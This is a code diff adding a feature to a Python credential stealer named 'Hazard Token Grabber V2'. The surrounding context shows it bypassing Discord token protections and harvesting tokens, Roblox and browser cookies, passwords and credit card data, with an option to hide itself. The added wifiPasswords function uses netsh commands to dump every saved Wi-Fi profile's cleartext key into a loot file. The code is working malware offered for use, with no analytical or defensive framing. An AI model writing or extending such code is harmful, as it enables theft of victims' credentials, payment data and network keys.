@@ -246,7 +246,7 @@ class Hazard_Token_Grabber_V2(functions):
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
-                         self.grabRobloxCookie, self.grabCookies, self.grabPassword, self.creditInfo]
+                         self.grabRobloxCookie, self.grabCookies, self.grabPassword, self.creditInfo, self.wifiPasswords]
         if self.fetchConf('hide_self'):
             function_list.append(self.hide)
 
@@ -850,6 +850,37 @@ class Hazard_Token_Grabber_V2(functions):
                     conn.close()
                     os.remove(login)
 
+    @try_extract
+    def wifiPasswords(self):
+        meta_data = subprocess.check_output('netsh wlan show profiles')
+        data = meta_data.decode('utf-8', errors="backslashreplace")
+        data = data.split('\n')
+        profiles = []
+
+        for i in data:
+            if "All User Profile" in i:
+                i = i.split(":")
+                i = i[1]
+                i = i[1:-1]
+                profiles.append(i)
+
+        if profiles != []:
+            with open(self.dir + "\\Wifi Passwords.txt", 'w', encoding="cp437", errors='ignore') as f:
+                f.write("{:<30}| {:<}\n".format("Wi-Fi Name", "Password"))
+                f.write("----------------------------------------------\n")
+                for i in profiles:
+                    try:
+                        results = subprocess.check_output(f'netsh wlan show profile {i} key = clear')
+                        results = results.decode('utf-8', errors="backslashreplace")
+                        results = results.split('\n')
+                        results = [b.split(":")[1][1:-1]for b in results if "Key Content" in b]
+                        try:
+                            f.write("{:<30}| {:<}\n".format(i, results[0]))
+                        except IndexError:
+                            f.write("{:<30}| {:<}\n".format(i, ""))
+                    except subprocess.CalledProcessError:
+                        pass
+                    
     def neatifyTokens(self):
         f = open(self.dir+"\\Discord Info.txt",
                  "w", encoding="cp437", errors='ignore')
